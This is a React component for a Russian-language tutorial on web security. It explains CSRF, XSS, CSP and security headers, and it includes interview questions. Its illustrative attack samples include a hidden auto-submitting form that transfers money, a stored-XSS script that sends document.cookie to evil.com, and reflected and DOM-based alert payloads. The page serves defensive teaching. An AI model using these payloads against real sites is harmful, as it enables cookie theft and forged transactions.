import { useState } from 'react'

type Tab = 'csrf' | 'xss' | 'csp' | 'headers' | 'interview'

const cspDirectives = [
  { directive: "default-src 'self'", desc: 'Всё по умолчанию — только с текущего домена' },
  { directive: "script-src 'self' 'nonce-abc123'", desc: 'Скрипты: свои + с конкретным nonce' },
  { directive: "style-src 'self' 'unsafe-inline'", desc: 'Стили: свои + inline (небезопасно!)' },
  { directive: "img-src * data:", desc: 'Картинки: откуда угодно + data: URI' },
  { directive: "connect-src 'self' https://api.example.com", desc: 'fetch/XHR/WebSocket: свои + конкретный API' },
  { directive: "frame-src 'none'", desc: 'Запрет вставки iframe' },
  { directive: "object-src 'none'", desc: 'Запрет Flash/Java plugins (рекомендуется всегда)' },
  { directive: "base-uri 'self'", desc: 'Запрет подмены <base> — защита от open redirect' },
  { directive: "form-action 'self'", desc: 'Формы могут отправляться только на свой домен' },
  { directive: 'upgrade-insecure-requests', desc: 'Автоматически заменять http:// → https://' },
  { directive: 'report-uri /csp-report', desc: 'URL для отправки отчётов о нарушениях CSP' },
]

const securityHeaders = [
  { header: 'Content-Security-Policy', desc: 'Контроль источников ресурсов (скрипты, стили, картинки)', importance: 'critical' },
  { header: 'Strict-Transport-Security', desc: 'HSTS — заставляет браузер всегда использовать HTTPS', importance: 'critical' },
  { header: 'X-Content-Type-Options', desc: 'nosniff — запрет MIME-sniffing (не угадывать тип)', importance: 'high' },
  { header: 'X-Frame-Options', desc: 'DENY/SAMEORIGIN — защита от clickjacking через iframe', importance: 'high' },
  { header: 'Referrer-Policy', desc: 'Что передавать в Referer при навигации', importance: 'medium' },
  { header: 'Permissions-Policy', desc: 'Контроль доступа к API (camera, microphone, geolocation)', importance: 'medium' },
  { header: 'X-XSS-Protection', desc: '⚠️ Устаревший! Встроенный XSS-фильтр (только IE/старый Chrome)', importance: 'deprecated' },
]

export default function WebSecurityDemo() {
  const [activeTab, setActiveTab] = useState<Tab>('csrf')

  return (
    <div className="page-container">
      <h1>🔒 Web Security: CSRF, XSS, CSP</h1>
      <p className="page-description">
        Три главных вектора атак в веб-приложениях и механизмы защиты. 
        Обязательные знания для middle+ разработчика.
      </p>

      <div className="tabs" style={{ marginBottom: '24px' }}>
        {[
          { key: 'csrf', label: '🎭 CSRF' },
          { key: 'xss', label: '💉 XSS' },
          { key: 'csp', label: '🛡️ CSP' },
          { key: 'headers', label: '📋 Security Headers' },
          { key: 'interview', label: '🎯 Вопросы' },
        ].map(tab => (
          <button
            key={tab.key}
            className={`tab ${activeTab === tab.key ? 'active' : ''}`}
            onClick={() => setActiveTab(tab.key as Tab)}
          >
            {tab.label}
          </button>
        ))}
      </div>

      {/* CSRF */}
      {activeTab === 'csrf' && (
        <>
          <div className="card">
            <div className="card-header">
              <span className="card-title">🎭 CSRF — Cross-Site Request Forgery</span>
              <span className="card-badge">Важно!</span>
            </div>

            <div className="info-box">
              <strong>Суть атаки:</strong> Злоумышленник заставляет браузер авторизованного пользователя 
              выполнить нежелательный запрос к доверенному сайту. Браузер автоматически прикрепляет cookies!
            </div>

            <h4 style={{ margin: '20px 0 12px' }}>📐 Схема атаки</h4>
            <div style={{ 
              padding: '20px', 
              background: 'var(--bg-code)', 
              borderRadius: '8px',
              fontFamily: 'monospace',
              fontSize: '0.85rem',
              lineHeight: 2
            }}>
              <div>1️⃣ Пользователь залогинен на <span style={{ color: 'var(--accent-green)' }}>bank.com</span> (есть session cookie)</div>
              <div>2️⃣ Переходит на <span style={{ color: 'var(--accent-red)' }}>evil.com</span></div>
              <div>3️⃣ На evil.com скрытая форма:</div>
              <pre style={{ 
                padding: '12px', 
                background: 'rgba(239, 68, 68, 0.08)', 
                borderRadius: '4px', 
                margin: '4px 0 4px 24px',
                border: '1px solid rgba(239, 68, 68, 0.15)'
              }}>
{`<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="hacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit()</script>`}
              </pre>
              <div>4️⃣ Браузер отправляет POST на bank.com <span style={{ color: 'var(--accent-red)' }}>с cookies пользователя!</span></div>
              <div>5️⃣ Сервер видит валидную сессию → выполняет перевод 💸</div>
            </div>
          </div>

          <div className="card">
            <div className="card-header">
              <span className="card-title">🛡️ Методы защиты от CSRF</span>
            </div>

            <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
              {[
                {
                  name: 'SameSite Cookies',
                  level: 'Основной',
                  color: 'var(--accent-green)',
                  desc: 'SameSite=Lax/Strict не отправляет куки при cross-site запросах. Дефолт в Chrome.',
                  code: `Set-Cookie: session=abc; SameSite=Lax; Secure; HttpOnly`
                },
                {
                  name: 'CSRF Token',
                  level: 'Классический',
                  color: 'var(--accent-cyan)',
                  desc: 'Уникальный токен в форме + сессии. Сервер проверяет совпадение. Evil.com не знает токен.',
                  code: `<form>\n  <input type="hidden" name="_csrf" value="random-token-from-server">\n</form>`
                },
                {
                  name: 'Double Submit Cookie',
                  level: 'Stateless',
                  color: 'var(--accent-orange)',
                  desc: 'Токен и в cookie, и в header/body. Сервер проверяет совпадение. Evil.com не может прочитать куку другого домена.',
                  code: `// Cookie: csrf=token123\nfetch('/api', { headers: { 'X-CSRF-Token': 'token123' } })`
                },
                {
                  name: 'Проверка Origin/Referer',
                  level: 'Дополнительный',
                  color: 'var(--accent-purple)',
                  desc: 'Сервер проверяет Origin или Referer header. Отклоняет если домен не совпадает.',
                  code: `if (req.headers.origin !== 'https://bank.com') return 403`
                },
              ].map(method => (
                <div key={method.name} style={{
                  padding: '16px',
                  background: 'var(--bg-code)',
                  borderRadius: '8px',
                  borderLeft: `3px solid ${method.color}`
                }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '6px' }}>
                    <strong style={{ color: method.color }}>{method.name}</strong>
                    <span style={{ 
                      fontSize: '0.7rem', 
                      padding: '2px 6px', 
                      background: `${method.color}22`,
                      color: method.color,
                      borderRadius: '4px' 
                    }}>{method.level}</span>
                  </div>
                  <p style={{ color: 'var(--text-secondary)', lineHeight: 1.5, marginBottom: '8px' }}>{method.desc}</p>
                  <pre style={{ fontSize: '0.8rem', padding: '8px', background: 'var(--bg-code)', borderRadius: '4px' }}>
                    {method.code}
                  </pre>
                </div>
              ))}
            </div>
          </div>
        </>
      )}

      {/* XSS */}
      {activeTab === 'xss' && (
        <>
          <div className="card">
            <div className="card-header">
              <span className="card-title">💉 XSS — Cross-Site Scripting</span>
              <span className="card-badge">Самая частая атака!</span>
            </div>

            <div className="info-box" style={{ background: 'rgba(239, 68, 68, 0.08)', border: '1px solid rgba(239, 68, 68, 0.2)' }}>
              <strong>Суть атаки:</strong> Внедрение вредоносного JavaScript в страницу. 
              Скрипт выполняется в контексте жертвы → доступ к cookies, localStorage, DOM.
            </div>

            <h4 style={{ margin: '20px 0 12px' }}>3 типа XSS</h4>
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '16px' }}>
              {[
                {
                  type: 'Stored (Хранимая)',
                  color: 'var(--accent-red)',
                  desc: 'Вредоносный скрипт сохраняется в БД (комментарий, профиль). Все пользователи видят его.',
                  example: `// Комментарий в БД:\n<script>fetch('https://evil.com?c='+document.cookie)</script>`,
                  danger: 'Самая опасная!'
                },
                {
                  type: 'Reflected (Отражённая)',
                  color: 'var(--accent-orange)',
                  desc: 'Скрипт в URL или форме, сервер отражает его в ответе без экранирования.',
                  example: `// URL:\nhttps://site.com/search?q=<script>alert(1)</script>\n\n// Сервер возвращает:\nРезультаты для: <script>alert(1)</script>`,
                  danger: 'Частая!'
                },
                {
                  type: 'DOM-based',
                  color: 'var(--accent-purple)',
                  desc: 'Скрипт не проходит через сервер. Уязвимость в клиентском JS (innerHTML, eval).',
                  example: `// Уязвимый код:\ndiv.innerHTML = location.hash.slice(1)\n\n// URL:\nhttps://site.com#<img onerror=alert(1) src=x>`,
                  danger: 'Сложно найти'
                },
              ].map(xss => (
                <div key={xss.type} style={{
                  padding: '16px',
                  background: 'var(--bg-code)',
                  borderRadius: '8px',
                  borderTop: `3px solid ${xss.color}`
                }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px' }}>
                    <h4 style={{ color: xss.color }}>{xss.type}</h4>
                    <span style={{ fontSize: '0.7rem', color: xss.color }}>{xss.danger}</span>
                  </div>
                  <p style={{ fontSize: '0.85rem', color: 'var(--text-secondary)', lineHeight: 1.5, marginBottom: '12px' }}>
                    {xss.desc}
                  </p>
                  <pre style={{ fontSize: '0.78rem', padding: '10px', background: 'var(--bg-code)', borderRadius: '4px', whiteSpace: 'pre-wrap' }}>
                    {xss.example}
                  </pre>
                </div>
              ))}
            </div>
          </div>

          <div className="card">
            <div className="card-header">
              <span className="card-title">🛡️ Защита от XSS</span>
            </div>

            <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
              {[
                { 
                  method: 'Экранирование вывода', 
                  icon: '1️⃣',
                  desc: 'Заменять < > & " \' на HTML-сущности. React/Vue делают это автоматически!',
                  safe: `// React автоматически экранирует:\n<div>{userInput}</div> // Безопасно!\n\n// Vue автоматически:\n<div>{{ userInput }}</div> // Безопасно!`,
                  danger: `// ОПАСНО — отключает экранирование:\n<div dangerouslySetInnerHTML={{__html: userInput}} />\n<div v-html="userInput"></div>`
                },
                {
                  method: 'Content Security Policy',
                  icon: '2️⃣',
                  desc: 'CSP запрещает inline-скрипты и скрипты с неизвестных доменов.',
                  safe: `Content-Security-Policy: script-src 'self' 'nonce-abc123'`,
                  danger: `// CSP блокирует:\n<script>alert(1)</script> // inline — заблокирован!`
                },
                {
                  method: 'HttpOnly cookies',
                  icon: '3️⃣',
                  desc: 'Если XSS случился — злоумышленник не сможет прочитать HttpOnly куки.',
                  safe: `Set-Cookie: session=abc; HttpOnly; Secure`,
                  danger: `// document.cookie не увидит HttpOnly куки`
                },
                {
                  method: 'Санитизация ввода',
                  icon: '4️⃣',
                  desc: 'Очищать HTML от опасных тегов. Библиотека: DOMPurify.',
                  safe: `import DOMPurify from 'dompurify'\nconst clean = DOMPurify.sanitize(userInput)`,
                  danger: `// Никогда: eval(userInput), innerHTML = userInput`
                },
              ].map(item => (
                <div key={item.method} style={{ padding: '16px', background: 'var(--bg-code)', borderRadius: '8px' }}>
                  <div style={{ display: 'flex', gap: '8px', alignItems: 'center', marginBottom: '8px' }}>
                    <span>{item.icon}</span>
                    <strong>{item.method}</strong>
                  </div>
                  <p style={{ color: 'var(--text-secondary)', fontSize: '0.85rem', marginBottom: '8px' }}>{item.desc}</p>
                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px' }}>
                    <div>
                      <div style={{ fontSize: '0.75rem', color: 'var(--accent-green)', marginBottom: '4px' }}>✅ Безопасно</div>
                      <pre style={{ fontSize: '0.78rem', padding: '8px', background: 'rgba(34, 197, 94, 0.05)', borderRadius: '4px', border: '1px solid rgba(34, 197, 94, 0.1)', whiteSpace: 'pre-wrap' }}>
                        {item.safe}
                      </pre>
                    </div>
                    <div>
                      <div style={{ fontSize: '0.75rem', color: 'var(--accent-red)', marginBottom: '4px' }}>❌ Опасно</div>
                      <pre style={{ fontSize: '0.78rem', padding: '8px', background: 'rgba(239, 68, 68, 0.05)', borderRadius: '4px', border: '1px solid rgba(239, 68, 68, 0.1)', whiteSpace: 'pre-wrap' }}>
                        {item.danger}
                      </pre>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </>
      )}

      {/* CSP */}
      {activeTab === 'csp' && (
        <>
          <div className="card">
            <div className="card-header">
              <span className="card-title">🛡️ CSP — Content Security Policy</span>
              <span className="card-badge">Глубокая тема!</span>
            </div>

            <div className="info-box">
              <strong>Что это:</strong> HTTP-заголовок, который указывает браузеру, откуда можно загружать ресурсы. 
              Если ресурс не подходит под правила — браузер его блокирует. Главная защита от XSS!
            </div>

            <h4 style={{ margin: '20px 0 12px' }}>📋 Основные директивы CSP</h4>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
              {cspDirectives.map((item, i) => (
                <div key={i} style={{ 
                  display: 'grid', 
                  gridTemplateColumns: '1fr 1fr', 
                  gap: '16px', 
                  padding: '10px 14px',
                  background: 'var(--bg-code)',
                  borderRadius: '6px',
                  alignItems: 'center'
                }}>
                  <code style={{ fontSize: '0.82rem', color: 'var(--accent-cyan)' }}>{item.directive}</code>
                  <span style={{ fontSize: '0.82rem', color: 'var(--text-secondary)' }}>{item.desc}</span>
                </div>
              ))}
            </div>
          </div>

          <div className="card">
            <div className="card-header">
              <span className="card-title">🔑 Nonce vs Hash</span>
            </div>

            <p style={{ color: 'var(--text-secondary)', marginBottom: '16px' }}>
              Как разрешить конкретные inline-скрипты без <code>unsafe-inline</code>:
            </p>

            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '16px' }}>
              <div style={{ padding: '16px', background: 'var(--bg-code)', borderRadius: '8px', borderTop: '3px solid var(--accent-cyan)' }}>
                <h4 style={{ color: 'var(--accent-cyan)', marginBottom: '10px' }}>Nonce (одноразовый)</h4>
                <pre style={{ fontSize: '0.82rem', lineHeight: 1.6 }}>
{`// Заголовок (сервер генерирует nonce):
Content-Security-Policy:
  script-src 'nonce-abc123'

// HTML:
<script nonce="abc123">
  alert('Разрешён!')
</script>

// Без nonce — заблокирован:
<script>alert('Nope!')</script>`}
                </pre>
                <div className="info-box" style={{ marginTop: '12px' }}>
                  Nonce должен быть случайным и <strong>новым при каждом запросе!</strong>
                </div>
              </div>

              <div style={{ padding: '16px', background: 'var(--bg-code)', borderRadius: '8px', borderTop: '3px solid var(--accent-orange)' }}>
                <h4 style={{ color: 'var(--accent-orange)', marginBottom: '10px' }}>Hash</h4>
                <pre style={{ fontSize: '0.82rem', lineHeight: 1.6 }}>
{`// Заголовок (хеш содержимого скрипта):
Content-Security-Policy:
  script-src 'sha256-xyz...'

// HTML (содержимое должно точно
// совпасть с хешем):
<script>alert('Разрешён!')</script>

// Плюсы: не нужен серверный рендеринг
// Минусы: хрупкость — любой пробел
// меняет хеш`}
                </pre>
              </div>
            </div>

            <div className="info-box warning" style={{ marginTop: '16px' }}>
              <strong>⚠️ report-only режим:</strong> Заголовок <code>Content-Security-Policy-Report-Only</code> не блокирует, 
              а только логирует нарушения. Идеально для внедрения CSP на существующих проектах!
            </div>
          </div>
        </>
      )}

      {/* Security Headers */}
      {activeTab === 'headers' && (
        <div className="card">
          <div className="card-header">
            <span className="card-title">📋 Security Headers — полный список</span>
          </div>

          <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
            {securityHeaders.map(h => (
              <div key={h.header} style={{
                display: 'grid',
                gridTemplateColumns: '280px 1fr auto',
                gap: '16px',
                padding: '14px 16px',
                background: 'var(--bg-code)',
                borderRadius: '8px',
                alignItems: 'center',
                opacity: h.importance === 'deprecated' ? 0.6 : 1
              }}>
                <code style={{ 
                  fontWeight: 600, 
                  color: h.importance === 'critical' ? 'var(--accent-red)' 
                    : h.importance === 'high' ? 'var(--accent-orange)' 
                    : h.importance === 'deprecated' ? 'var(--text-muted)' 
                    : 'var(--accent-cyan)',
                  fontSize: '0.85rem'
                }}>
                  {h.header}
                </code>
                <span style={{ color: 'var(--text-secondary)', fontSize: '0.85rem' }}>{h.desc}</span>
                <span style={{
                  fontSize: '0.7rem',
                  padding: '2px 8px',
                  borderRadius: '4px',
                  background: h.importance === 'critical' ? 'rgba(239, 68, 68, 0.1)' 
                    : h.importance === 'high' ? 'rgba(249, 115, 22, 0.1)' 
                    : h.importance === 'deprecated' ? 'rgba(100, 100, 100, 0.1)'
                    : 'rgba(99, 102, 241, 0.1)',
                  color: h.importance === 'critical' ? 'var(--accent-red)' 
                    : h.importance === 'high' ? 'var(--accent-orange)' 
                    : h.importance === 'deprecated' ? 'var(--text-muted)'
                    : 'var(--accent-cyan)',
                }}>
                  {h.importance === 'critical' ? '🔴 Обязательно' 
                    : h.importance === 'high' ? '🟠 Важно' 
                    : h.importance === 'deprecated' ? '⚪ Устарел'
                    : '🔵 Рекомендуется'}
                </span>
              </div>
            ))}
          </div>

          <h4 style={{ margin: '24px 0 12px' }}>📝 Пример идеальных заголовков</h4>
          <pre style={{ 
            padding: '16px', 
            background: 'var(--bg-code)', 
            borderRadius: '8px', 
            fontSize: '0.82rem', 
            lineHeight: 1.8,
            border: '1px solid rgba(34, 197, 94, 0.15)'
          }}>
{`Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; object-src 'none'
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()`}
          </pre>
        </div>
      )}

      {/* Вопросы */}
      {activeTab === 'interview' && (
        <div className="card">
          <div className="card-header">
            <span className="card-title">🎯 Вопросы для собеседования</span>
          </div>

          <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
            {[
              {
                q: 'Чем CSRF отличается от XSS?',
                a: 'CSRF — злоумышленник заставляет браузер жертвы выполнить запрос к доверенному сайту (эксплуатирует доверие СЕРВЕРА к браузеру). XSS — внедряет скрипт в сайт (эксплуатирует доверие ПОЛЬЗОВАТЕЛЯ к сайту). CSRF не может прочитать ответ, только отправить запрос.'
              },
              {
                q: 'Защищает ли SameSite=Lax от CSRF полностью?',
                a: 'Почти. Lax блокирует cross-site POST, fetch, iframe. Но пропускает GET при top-level навигации (клик по ссылке). Если у вас GET-эндпоинт с side effects (плохая практика!) — Lax не поможет. Strict защищает полностью, но ломает навигацию.'
              },
              {
                q: 'Что такое CSP и от чего защищает?',
                a: 'Content Security Policy — HTTP-заголовок, указывающий браузеру откуда разрешено загружать ресурсы (скрипты, стили, картинки). Главная защита от XSS: даже если злоумышленник внедрит inline-скрипт, CSP его заблокирует.'
              },
              {
                q: 'Что значит unsafe-inline в CSP?',
                a: 'Разрешает inline-скрипты и inline-стили. Сильно ослабляет CSP, так как XSS обычно и вставляет inline-код. Лучше использовать nonce или hash для конкретных скриптов.'
              },
              {
                q: 'Как React/Vue защищают от XSS?',
                a: 'Они автоматически экранируют текстовый контент: { } в React и {{ }} в Vue превращают HTML в безопасные текстовые строки. Но dangerouslySetInnerHTML (React) и v-html (Vue) отключают экранирование — использовать только с санитизированными данными!'
              },
              {
                q: 'Что такое HSTS и зачем preload?',
                a: 'HSTS (Strict-Transport-Security) заставляет браузер использовать HTTPS. max-age говорит сколько секунд помнить. preload — вносит домен в предзагруженный список браузера, так что даже первый запрос будет HTTPS. Без preload первый запрос может быть HTTP.'
              },
              {
                q: 'Как работает nonce в CSP?',
                a: 'Сервер генерирует случайный nonce при каждом ответе, добавляет его в CSP заголовок и в атрибут nonce= тегов script. Браузер разрешает только скрипты с совпадающим nonce. Злоумышленник не может угадать nonce, поэтому его inline-скрипт заблокируется.'
              },
              {
                q: 'Зачем X-Content-Type-Options: nosniff?',
                a: 'Без него браузер может "угадать" тип файла (MIME sniffing). Например, файл .txt с JS-кодом может быть выполнен как скрипт. nosniff запрещает это — файл обрабатывается строго как указано в Content-Type.'
              },
            ].map((item, i) => (
              <details key={i} className="interview-question">
                <summary style={{ 
                  cursor: 'pointer', 
                  padding: '14px 16px',
                  background: 'var(--bg-code)',
                  borderRadius: '8px',
                  fontWeight: 600,
                  fontSize: '0.9rem'
                }}>
                  {item.q}
                </summary>
                <div style={{ 
                  padding: '14px 16px',
                  color: 'var(--text-secondary)',
                  lineHeight: 1.6,
                  borderLeft: '3px solid var(--accent-cyan)',
                  marginLeft: '16px',
                  marginTop: '8px'
                }}>
                  {item.a}
                </div>
              </details>
            ))}
          </div>
        </div>
      )}
    </div>
  )
}
